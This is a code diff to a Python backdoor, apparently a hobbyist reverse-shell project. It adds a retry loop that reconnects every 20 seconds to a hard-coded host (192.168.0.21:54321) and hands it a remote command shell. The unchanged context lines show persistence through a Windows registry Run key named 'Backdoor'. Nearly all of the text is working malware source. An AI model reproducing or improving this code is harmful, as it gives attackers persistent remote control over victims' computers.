@@ -7,6 +7,8 @@ import os
 import base64
 import shutil
 import sys
+import time
+
 def relibale_send(data):
 	try:
 		json_data = json.dumps(data.decode('utf-8'))
@@ -25,6 +27,14 @@ def reliable_recv():
 			continue
 
 
+def connection():
+	while True:
+		time.sleep(20)
+		try:
+			sock.connect(("192.168.0.21", 54321))
+			shell()
+		except:
+			connection()
 def shell():
 	while True:
 		command = reliable_recv()
@@ -62,8 +72,9 @@ if not os.path.exists(location):
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + "'", shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("192.168.0.21", 54321))
-shell()
+###sock.connect(("192.168.0.21", 54321))
+connection()
+###shell()
 sock.close()
 
 
